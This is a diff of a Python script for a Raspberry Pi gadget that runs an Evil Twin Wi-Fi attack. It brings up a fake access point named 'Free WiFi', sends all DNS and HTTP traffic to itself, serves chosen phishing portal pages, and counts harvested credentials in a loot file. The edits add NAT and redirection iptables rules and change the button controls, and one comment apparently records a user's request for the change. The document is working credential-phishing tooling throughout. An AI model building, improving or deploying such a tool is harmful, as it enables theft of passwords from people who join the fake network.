@@ -19,19 +19,9 @@ Features:
 Controls:
 - MAIN SCREEN:
     - OK: Start Evil Twin attack.
-    - KEY1: Edit network interface.
-    - KEY2: Edit Fake AP SSID.
+    - KEY1: Edit Fake AP SSID. (Modified from original functionality)
+    - KEY2: Edit Fake AP Channel. (Modified from original functionality)
     - KEY3: Select Phishing Portal.
-- INTERFACE INPUT SCREEN:
-    - UP/DOWN: Change character at cursor position.
-    - LEFT/RIGHT: Move cursor.
-    - OK: Confirm interface.
-    - KEY3: Cancel input.
-- SSID INPUT SCREEN:
-    - UP/DOWN: Change character at cursor position.
-    - LEFT/RIGHT: Move cursor.
-    - OK: Confirm SSID.
-    - KEY3: Cancel input.
 - PORTAL SELECTION SCREEN:
     - UP/DOWN: Navigate available phishing portals.
     - OK: Select portal.
@@ -46,11 +36,12 @@ import signal
 import subprocess
 import threading
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))) # Add parent directory for consistency
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 
-WIFI_INTERFACE = "wlan1"
+WIFI_INTERFACE = "wlan1" # Hardcoded to wlan1 as per user request for evil twin attacks
 FAKE_AP_SSID = "Free WiFi"
 FAKE_AP_CHANNEL = "6"
 RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
@@ -86,9 +77,15 @@ def cleanup(*_):
             try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM) 
             except: pass
         attack_processes.clear()
+        
+        # Restore network settings
         subprocess.run("iptables -F; iptables -t nat -F", shell=True)
         subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down; iwconfig {WIFI_INTERFACE} mode managed; ifconfig {WIFI_INTERFACE} up", shell=True)
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
+        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True) # Restore to managed mode
+        subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
+        subprocess.run("systemctl start NetworkManager", shell=True) # Restart NetworkManager
+        subprocess.run("systemctl start wpa_supplicant", shell=True) # Restart wpa_supplicant
         if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)
 
 signal.signal(signal.SIGINT, cleanup)
@@ -99,7 +96,8 @@ def show_message(lines, color="lime"):
     d = ImageDraw.Draw(img)
     font = FONT_TITLE
     y = 40
-    for line in lines:
+    message_list = lines if isinstance(lines, list) else [lines]
+    for line in message_list:
         bbox = d.textbbox((0, 0), line, font=font)
         w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
         x = (128 - w) // 2
@@ -120,22 +118,15 @@ def draw_ui(screen_state="main", status: str = ""):
         d.text((5, 70), FAKE_AP_SSID[:16], font=FONT_TITLE, fill="yellow")
         d.text((5, 85), "Channel:", font=FONT, fill="white")
         d.text((5, 100), FAKE_AP_CHANNEL, font=FONT_TITLE, fill="yellow")
-        d.text((5, 115), "OK=Start | KEY1=Edit Iface | KEY2=Edit SSID | KEY3=Exit", font=FONT, fill="cyan")
-    elif screen_state == "iface_input":
-        d.text((5, 30), "Enter Interface:", font=FONT, fill="white")
-        display_iface = list(current_interface_input)
-        if interface_input_cursor_pos < len(display_iface):
-            display_iface[interface_input_cursor_pos] = '_'
-        d.text((5, 50), "".join(display_iface[:16]), font=FONT_TITLE, fill="yellow")
-        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
-    elif screen_state == "ssid_input":
+        d.text((5, 115), "OK=Start | KEY1=Edit SSID | KEY2=Edit Channel | KEY3=Select Portal", font=FONT, fill="cyan") # Modified
+    elif screen_state == "ssid_input": # Simplified inputs
         d.text((5, 30), "Enter SSID:", font=FONT, fill="white")
         display_ssid = list(current_ssid_input)
         if ssid_input_cursor_pos < len(display_ssid):
             display_ssid[ssid_input_cursor_pos] = '_'
         d.text((5, 50), "".join(display_ssid[:16]), font=FONT_TITLE, fill="yellow")
         d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
-    elif screen_state == "channel_input":
+    elif screen_state == "channel_input": # Simplified inputs
         d.text((5, 30), "Enter Channel:", font=FONT, fill="white")
         display_channel = list(current_channel_input)
         if channel_input_cursor_pos < len(display_channel):
@@ -149,7 +140,6 @@ def draw_ui(screen_state="main", status: str = ""):
         if not html_files_list:
             d.text((5, 40), "No HTML files found!", font=FONT, fill="red")
         else:
-            # Display scroll indicators if needed
             if scroll_offset > 0:
                 d.text((60, 25), "^", font=FONT, fill="white")
             if scroll_offset + VISIBLE_ITEMS < len(html_files_list):
@@ -183,28 +173,32 @@ def draw_ui(screen_state="main", status: str = ""):
     
     LCD.LCD_ShowImage(img, 0, 0)
 
-def handle_text_input_logic(initial_text, screen_state_name, char_set):
-    global current_interface_input, interface_input_cursor_pos, current_ssid_input, ssid_input_cursor_pos, current_channel_input, channel_input_cursor_pos, WIFI_INTERFACE, FAKE_AP_SSID, FAKE_AP_CHANNEL
+def handle_text_input_logic(initial_text, input_type, char_set): # Renamed screen_state_name to input_type
+    global current_ssid_input, ssid_input_cursor_pos, current_channel_input, channel_input_cursor_pos, FAKE_AP_SSID, FAKE_AP_CHANNEL
     
-    target_input = None
-    target_cursor_pos = None
+    current_value = list(initial_text)
+    cursor_pos = len(initial_text) - 1
 
-    if screen_state_name == "iface_input":
-        target_input = [current_interface_input, "current_interface_input"]
-        target_cursor_pos = [interface_input_cursor_pos, "interface_input_cursor_pos"]
-    elif screen_state_name == "ssid_input":
-        target_input = [current_ssid_input, "current_ssid_input"]
-        target_cursor_pos = [ssid_input_cursor_pos, "ssid_input_cursor_pos"]
-    else:
-        target_input = [current_channel_input, "current_channel_input"]
-        target_cursor_pos = [channel_input_cursor_pos, "channel_input_cursor_pos"]
-
-    current_value = list(target_input[0])
-    cursor_pos = target_cursor_pos[0]
-
-    draw_ui(screen_state_name)
-    
     while running:
+        if input_type == "ssid_input":
+            draw_ui("ssid_input")
+        elif input_type == "channel_input":
+            draw_ui("channel_input")
+        
+        display_text = list(current_value)
+        if cursor_pos < len(display_text):
+            display_text[cursor_pos] = '_'
+        # Redraw only the input line
+        img = Image.new("RGB", (128, 128), "black")
+        d = ImageDraw.Draw(img)
+        if input_type == "ssid_input":
+            d.text((5, 30), "Enter SSID:", font=FONT, fill="white")
+        elif input_type == "channel_input":
+            d.text((5, 30), "Enter Channel:", font=FONT, fill="white")
+        d.text((5, 50), "".join(display_text), font=FONT_TITLE, fill="yellow")
+        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
+        LCD.LCD_ShowImage(img, 0, 0)
+
         btn = None
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
@@ -219,15 +213,11 @@ def handle_text_input_logic(initial_text, screen_state_name, char_set):
         if btn == "OK":
             if current_value:
                 new_value = "".join(current_value)
-                if screen_state_name == "iface_input":
-                    WIFI_INTERFACE = new_value
-                    current_interface_input = new_value
-                    interface_input_cursor_pos = cursor_pos
-                elif screen_state_name == "ssid_input":
+                if input_type == "ssid_input":
                     FAKE_AP_SSID = new_value
                     current_ssid_input = new_value
                     ssid_input_cursor_pos = cursor_pos
-                else:
+                elif input_type == "channel_input":
                     FAKE_AP_CHANNEL = new_value
                     current_channel_input = new_value
                     channel_input_cursor_pos = cursor_pos
@@ -237,14 +227,15 @@ def handle_text_input_logic(initial_text, screen_state_name, char_set):
                 time.sleep(2)
                 current_value = list(initial_text)
                 cursor_pos = len(initial_text) - 1
-                draw_ui(screen_state_name)
+                if input_type == "ssid_input":
+                    draw_ui("ssid_input")
+                elif input_type == "channel_input":
+                    draw_ui("channel_input")
         
         if btn == "LEFT":
             cursor_pos = max(0, cursor_pos - 1)
-            draw_ui(screen_state_name)
         elif btn == "RIGHT":
             cursor_pos = min(len(current_value), cursor_pos + 1)
-            draw_ui(screen_state_name)
         elif btn == "UP" or btn == "DOWN":
             if cursor_pos < len(current_value):
                 current_char = current_value[cursor_pos]
@@ -258,7 +249,6 @@ def handle_text_input_logic(initial_text, screen_state_name, char_set):
                     current_value[cursor_pos] = char_set[char_index]
                 except ValueError:
                     current_value[cursor_pos] = char_set[0]
-                draw_ui(screen_state_name)
             elif cursor_pos == len(current_value):
                 if btn == "UP":
                     current_value.append(char_set[0])
@@ -266,9 +256,8 @@ def handle_text_input_logic(initial_text, screen_state_name, char_set):
                     if len(current_value) > 0:
                         current_value.pop()
                         cursor_pos = max(0, cursor_pos - 1)
-                draw_ui(screen_state_name)
         
-        time.sleep(0.1)
+        time.sleep(0.05)
     return None
 
 def handle_file_selection_logic():
@@ -313,7 +302,7 @@ def handle_file_selection_logic():
             if html_file_index >= scroll_offset + VISIBLE_ITEMS:
                 scroll_offset = html_file_index - VISIBLE_ITEMS + 1
             current_html_file = html_files_list[html_file_index]
-        elif btn == "OK":
+        elif btn== "OK":
             CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
             LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
             draw_ui("main")
@@ -325,18 +314,40 @@ def handle_file_selection_logic():
         time.sleep(0.1)
 
 def start_attack():
+    # Kill conflicting processes
     subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
+    
+    # Create temporary config directory
     os.makedirs(TEMP_CONF_DIR, exist_ok=True)
+    
+    # Configure hostapd
     hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
     with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={FAKE_AP_SSID}\nhw_mode=g\nchannel={FAKE_AP_CHANNEL}\n")
+    
+    # Configure dnsmasq
     dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
     with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\n")
+    
+    # Clear old loot file if it exists
     if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
     
+    # Bring interface down, set to master mode, and bring up with static IP
     subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
     subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True)
     subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True)
     
+    # Enable IP forwarding
+    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    
+    # Setup iptables for NAT and DNS redirection
+    subprocess.run("iptables -F", shell=True)
+    subprocess.run("iptables -t nat -F", shell=True)
+    subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53", shell=True)
+    subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 80", shell=True)
+    subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o eth0 -j ACCEPT", shell=True) # Assuming eth0 is internet-facing
+    subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True) # Assuming eth0 is internet-facing
+
+    # Start hostapd
     attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['hostapd'].poll() is not None:
@@ -344,6 +355,7 @@ def start_attack():
         print(f"ERROR: hostapd failed to start. Stderr: {error_msg}", file=sys.stderr)
         return False, f"hostapd failed: {error_msg[:50]}..."
 
+    # Start dnsmasq
     attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['dnsmasq'].poll() is not None:
@@ -351,6 +363,7 @@ def start_attack():
         print(f"ERROR: dnsmasq failed to start. Stderr: {error_msg}", file=sys.stderr)
         return False, f"dnsmasq failed: {error_msg[:50]}..."
 
+    # Start PHP web server
     attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     time.sleep(2)
     if attack_processes['php'].poll() is not None:
@@ -364,20 +377,28 @@ def monitor_status():
     while running:
         try:
             with open("/var/lib/misc/dnsmasq.leases", "r") as f: status_info["clients"] = len(f.readlines())
-        except: status_info["clients"] = 0
+        except:
+            status_info["clients"] = 0
         try:
-            with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----")) -1
-        except: status_info["credentials"] = 0
+            with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----\n")) -1
+        except:
+            status_info["credentials"] = 0
         time.sleep(5)
 
 if __name__ == '__main__':
+    current_screen = "main"
+    is_attacking = False
     try:
         last_button_press_time = 0
         BUTTON_DEBOUNCE_TIME = 0.3 # seconds
 
+        # Initialize current_xxx_input variables
         current_interface_input = WIFI_INTERFACE
         current_ssid_input = FAKE_AP_SSID
         current_channel_input = FAKE_AP_CHANNEL
+        interface_input_cursor_pos = len(current_interface_input)
+        ssid_input_cursor_pos = len(current_ssid_input)
+        channel_input_cursor_pos = len(current_channel_input)
 
         while running:
             current_time = time.time()
@@ -386,29 +407,29 @@ if __name__ == '__main__':
                 draw_ui("main")
                 if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                     last_button_press_time = current_time
-                    new_iface = handle_text_input_logic(current_interface_input, "iface_input", CHAR_SET)
-                    if new_iface is not None:
-                        WIFI_INTERFACE = new_iface
-                        current_interface_input = new_iface
-                    time.sleep(BUTTON_DEBOUNCE_TIME)
-                elif GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
-                    last_button_press_time = current_time
-                    new_ssid = handle_text_input_logic(current_ssid_input, "ssid_input", CHAR_SET)
+                    new_ssid = handle_text_input_logic(current_ssid_input, "ssid_input", CHAR_SET) # Edited: KEY1 edits SSID
                     if new_ssid is not None:
                         FAKE_AP_SSID = new_ssid
                         current_ssid_input = new_ssid
                     time.sleep(BUTTON_DEBOUNCE_TIME)
+                elif GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
+                    last_button_press_time = current_time
+                    new_channel = handle_text_input_logic(current_channel_input, "channel_input", "0123456789") # Edited: KEY2 edits Channel
+                    if new_channel is not None:
+                        FAKE_AP_CHANNEL = new_channel
+                        current_channel_input = new_channel
+                    time.sleep(BUTTON_DEBOUNCE_TIME)
                 elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                     last_button_press_time = current_time
-                    draw_ui("STARTING")
+                    show_message("STARTING...", "yellow") # Changed draw_ui to show_message
                     success, error_message = start_attack()
                     if success:
                         is_attacking = True
                         current_screen = "attacking"
                         threading.Thread(target=monitor_status, daemon=True).start()
                     else:
-                        draw_ui("error", error_message)
-                        while GPIO.input(PINS["OK"]) != 0:
+                        show_message(["ERROR:", error_message], "red") # Changed draw_ui to show_message
+                        while GPIO.input(PINS["OK"]) != 0: # Wait for user to acknowledge error
                             time.sleep(0.1)
                         current_screen = "main"
                     time.sleep(BUTTON_DEBOUNCE_TIME)
@@ -424,7 +445,7 @@ if __name__ == '__main__':
                 draw_ui("attacking", "ACTIVE")
                 if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                     last_button_press_time = current_time
-                    draw_ui("stopping")
+                    show_message("STOPPING...", "yellow") # Changed draw_ui to show_message
                     cleanup()
                     is_attacking = False
                     current_screen = "main"
